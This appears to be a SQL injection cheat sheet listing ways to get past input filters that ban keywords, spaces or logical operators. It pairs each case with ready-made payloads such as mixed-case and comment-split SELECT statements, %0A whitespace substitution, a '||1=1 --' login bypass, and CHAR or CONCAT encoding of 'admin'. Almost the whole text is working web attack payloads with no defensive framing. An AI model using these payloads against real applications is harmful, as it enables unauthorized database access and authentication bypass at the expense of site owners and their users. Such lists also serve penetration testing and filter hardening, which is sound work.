
# Keywords like SELECT are banned
## SQL keywords can often be bypassed by changing their case or adding inline comments to break them up
 	SElEcT * FrOm users or SE/**/LECT * FROM/**/users
# Spaces are banned
## Using alternative whitespace characters or comments to replace spaces can help bypass filters.
  SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users
# Logical operators like AND, OR are banned
## Using alternative logical operators or concatenation to bypass keyword filters.
 	username = 'admin' && password = 'password' or username = 'admin'/**/||/**/1=1 --
# Common keywords like UNION, SELECT are banned
## Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.
 	SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)
# Specific keywords like OR, AND, SELECT, UNION are banned
## Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments.
 	SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users